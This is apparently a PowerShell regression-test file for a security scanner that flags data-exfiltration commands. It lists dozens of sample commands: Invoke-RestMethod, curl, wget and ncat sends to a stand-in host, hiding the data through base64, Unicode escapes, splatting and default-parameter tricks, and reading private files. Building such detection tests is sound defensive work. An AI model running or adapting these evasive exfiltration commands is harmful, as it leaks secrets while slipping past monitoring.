# AST-only fixture: synthetic data and an invalid DNS destination; no sends executed.
$regUri = 'https://regression.invalid/upload'
$rows = @(
    @(1, ('Write-Host test; Invoke-RestMethod -Uri "{0}" -Method Post -Body "fixture-sensitive-xyz"' -f $regUri)),
    @(1, ('Write-Verbose test; Invoke-RestMethod -Uri "{0}" -Method Post -Body "fixture-sensitive-xyz"' -f $regUri)),
    @(1, ('Invoke-RestMethod -Uri "{0}" -Method Post -Headers @{{"X-Test"="1"}} -Body "fixture-sensitive-xyz"' -f $regUri)),
    @(1, ('curl -k -d "fixture-sensitive-xyz" "{0}"' -f $regUri)),
    @(1, ('Invoke-RestMethod -Uri "{0}?q=fixture%2Dsensitive%2Dxyz"' -f $regUri)),
    @(1, ('curl.exe "{0}?q=fixture-sensitive-xyz"' -f $regUri)),
    @(1, ('wget.exe "{0}?q=fixture-sensitive-xyz"' -f $regUri)),
    @(1, ('Invoke-RestMethod -Uri "{0}?q=Zml4dHVyZS1zZW5zaXRpdmUteHl6"' -f $regUri)),
    @(1, ('Invoke-RestMethod -Uri "{0}" -Method Post -Headers @{{"X-Test"="fixture-sensitive-xyz"}}' -f $regUri)),
    @(1, ('& ".\curl.exe" -k -d "fixture-sensitive-xyz" "{0}"' -f $regUri)),
    @(1, ('& "C:\Windows\System32\curl.exe" -k -d "fixture-sensitive-xyz" "{0}"' -f $regUri)),
    @(1, 'cat -LiteralPath private.txt | ncat.exe regression.invalid 8080'),
    @(1, 'Get-Content -Raw protected/a.txt | ncat.exe --send-only regression.invalid 8080'),
    @(0, 'Get-Content -Raw protected/a.txt | ncat.exe --recv-only regression.invalid 8080'),
    @(1, ('$guardRegOpts=@{{Uri="{0}";Method="Post";Body="fixture-sensitive-xyz"}}; Invoke-RestMethod @guardRegOpts' -f $regUri)),
    @(2, ('$guardRegOpts=@{{Uri="{0}";Method="Post";Body="fixture-sensitive-xyz"}}; Invoke-RestMethod @guardRegOpts -Body "ordinary"' -f $regUri)),
    @(1, ('Invoke-RestMethod -Ur "{0}" -Met Post -Bo "fixture-sensitive-xyz"' -f $regUri)),
    @(1, ('$PSDefaultParameterValues=@{{"Invoke-RestMethod:Body"="fixture-sensitive-xyz"}}; Invoke-RestMethod -Uri "{0}" -Method Post' -f $regUri)),
    @(1, ('$guardRegText="fixture-sensitive-xyz"; Invoke-RestMethod -Uri "{0}" -Method Post -Body "x=$guardRegText"' -f $regUri)),
    @(1, ('$guardRegText="fixture-sensitive-xyz"; Invoke-RestMethod -Uri "{0}" -Method Post -Body "x=$($guardRegText)"' -f $regUri)),
    @(1, ('Invoke-RestMethod -Uri "{0}" -Method Post -Body @{{"safe"="fixture-sensitive-xyz"}}' -f $regUri)),
    @(1, ('Invoke-RestMethod -Uri "{0}" -Method Post -Body "name=Zml4dHVyZS1zZW5zaXRpdmUteHl6"' -f $regUri)),
    @(3, ('Invoke-RestMethod -Uri "{0}" -Method Post -Body "name=//8AAAEAAP8A"' -f $regUri)),
    @(1, ('$guardPieces=@("fixture-", "sensitive-xyz"); Invoke-RestMethod -Uri "{0}" -Method Post -Body ($guardPieces -join "")' -f $regUri)),
    @(2, ('$guardRegText="fixture-sensitive-xyz"; Invoke-RestMethod -Uri "{0}" -Method Post -Body ($guardRegText.Replace("fixture-sensitive-xyz","ordinary"))' -f $regUri)),
    @(3, ('$guardRegText="fixture-sensitive-xyz"; Write-Verbose test; Invoke-RestMethod -Uri "{0}" -Method Post -Body $guardRegText' -f $regUri))
)
$idx=0
foreach($entry in $rows) {
    $idx++
    $report=Scan $entry[1]
    Is $entry[0] $report "security TODO regression $idx"
    if($idx -ge 5 -and $idx -le 8 -and $report.report.policy.evidence[0].endpoint.Contains('?')) { throw 'Query appeared in structured endpoint' }
}
Is 0 (Scan '$guardRuntimeTable=@{Uri="https://regression.invalid/";Method="Post";Body="fixture-sensitive-xyz"}' -ExecuteLocal) 'runtime table setup'
Is 1 (Scan 'Invoke-RestMethod @guardRuntimeTable') 'runtime splat'
Is 0 (Scan '$guardRuntimeBytes=[Text.Encoding]::UTF8.GetBytes("fixture-sensitive-xyz")' -ExecuteLocal) 'runtime bytes setup'
Is 1 (Scan 'Invoke-RestMethod -Uri https://regression.invalid/ -Method Post -Body $guardRuntimeBytes') 'runtime byte array'
$extra = @(
    @(1, ('$argsForWeb=@("{0}"); Invoke-RestMethod @argsForWeb -Body "fixture-sensitive-xyz"' -f $regUri)),
    @(3, ('$PSDefaultParameterValues=@{{"Invoke-RestMethod:Body"="fixture-sensitive-xyz";"Invoke-*:Body"="ordinary"}}; Invoke-RestMethod -Uri "{0}" -Method Post' -f $regUri)),
    @(1, ('$PSDefaultParameterValues=@{{"Invoke-RestMethod:Body"="fixture-sensitive-xyz";"Invoke-*:Body"="fixture-sensitive-xyz"}}; Invoke-RestMethod -Uri "{0}" -Method Post' -f $regUri)),
    @(2, ('$PSDefaultParameterValues=@{{"Invoke-RestMethod:Body"="fixture-sensitive-xyz";"Disabled"=$true}}; Invoke-RestMethod -Uri "{0}" -Method Post -Body "ordinary"' -f $regUri)),
    @(1, ('$PSDefaultParameterValues=@{{}}; $PSDefaultParameterValues["Invoke-RestMethod:Body"]="fixture-sensitive-xyz"; Invoke-RestMethod -Uri "{0}" -Method Post' -f $regUri)),
    @(1, ('$PSDefaultParameterValues=@{{"Invoke-[R]estMethod:B?dy"="fixture-sensitive-xyz"}}; Invoke-RestMethod -Uri "{0}" -Method Post' -f $regUri)),
    @(2, ('$PSDefaultParameterValues=@{{"Invoke-RestMethod:Body"="fixture-sensitive-xyz"}}; Invoke-RestMethod -Uri "{0}" -Method Post -Body "ordinary"' -f $regUri)),
    @(3, ('$PSDefaultParameterValues=@{{"Invoke-RestMethod:Body"={{"fixture-sensitive-xyz"}}}}; Invoke-RestMethod -Uri "{0}" -Method Post' -f $regUri)),
    @(1, ('$t=@{{note="fixture-sensitive-xyz"}}; Invoke-RestMethod -Uri "{0}" -Method Post -Body $t.note' -f $regUri)),
    @(1, ('$t=@("safe","fixture-sensitive-xyz"); Invoke-RestMethod -Uri "{0}" -Method Post -Body "$($t[-1])"' -f $regUri)),
    @(1, ('$guardX="fixture-sensitive-xyz"; Invoke-RestMethod -Uri "{0}" -Body "quoted ""value"" `t${{guardX}}"' -f $regUri)),
    @(1, ("Invoke-RestMethod -Uri '$regUri' -Method Post -Body " + '''{"part":{"items":["Zml4dHVyZS1zZW5zaXRpdmUteHl6"]}}''')),
    @(1, ("Invoke-RestMethod -Uri '$regUri' -Method Post -Body " + '''{"part":"fixture\u002dsensitive\u002dxyz"}''')),
    @(3, ("Invoke-RestMethod -Uri '$regUri' -Method Post -Body " + '''{"part":"//8AAAEAAP8A"}'''))
)
foreach ($entry in $extra) { $idx++; Is $entry[0] (Scan $entry[1]) "extended TODO regression $idx" }
"PASS: $($idx + 4) P0/P1 command-analysis cases."
